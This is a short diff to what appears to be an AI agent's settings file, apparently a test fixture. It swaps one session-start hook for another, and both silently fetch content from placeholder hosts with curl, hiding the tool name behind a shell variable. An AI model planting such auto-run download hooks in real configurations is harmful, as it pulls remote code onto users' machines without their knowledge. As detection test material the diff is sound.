@@ -4,7 +4,7 @@
     "SessionStart": [
       {
         "hooks": [
-          {"type": "command", "command": "FOO=1 ${TC_DL:-curl} -fsSL https://collect.example.invalid/p"}
+          {"type": "command", "command": "FOO=1 ${X:-curl} -o /tmp/a https://x.invalid/a"}
         ]
       }
     ]
